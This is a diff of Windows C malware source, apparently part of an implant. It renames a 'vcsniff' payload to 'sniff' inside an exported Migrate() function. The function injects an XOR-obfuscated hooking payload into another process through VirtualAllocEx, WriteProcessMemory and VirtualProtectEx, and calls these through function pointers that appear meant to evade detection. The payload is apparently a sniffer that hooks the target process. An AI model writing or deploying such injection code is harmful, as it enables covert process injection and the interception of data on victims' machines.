@@ -1,9 +1,9 @@
 #include <Windows.h>
 
-#include "execute64.bin.inc"
-#include "wownative.bin.inc"
+#include "execute64.bin.h"
+#include "wownative.bin.h"
 
-#include "../vcsniff/vcsniff.bin.inc"
+#include "../sniff/sniff.bin.h"
 
 #define UTILS_IMPLEMENTATION
 #include "../utils.h"
@@ -84,24 +84,24 @@ __declspec(dllexport) void Migrate()
     }
 
     // Allocate memory in the target process
-    lpvPayloadMem = pVirtualAllocEx(hProc, NULL, vcsniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    lpvPayloadMem = pVirtualAllocEx(hProc, NULL, sniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (lpvPayloadMem == NULL)
     {
         goto shutdown;
     }
 
     // Un Xor the payload before writing it to the memory allocated in the target process
-    MyXor(vcsniff_data, vcsniff_data_len, key, key_len);
+    MyXor(sniff_data, sniff_data_len, key, key_len);
 
     // Write the hooking payload to the memory
-    if (!pWriteProcessMemory(hProc, lpvPayloadMem, vcsniff_data, vcsniff_data_len, NULL))
+    if (!pWriteProcessMemory(hProc, lpvPayloadMem, sniff_data, sniff_data_len, NULL))
     {
         goto shutdown;
     }
 
     // Change the permission of the memory to execute read
     DWORD dwOldProtect = 0;
-    if (!pVirtualProtectEx(hProc, lpvPayloadMem, vcsniff_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
+    if (!pVirtualProtectEx(hProc, lpvPayloadMem, sniff_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
     {
         goto shutdown;
     }
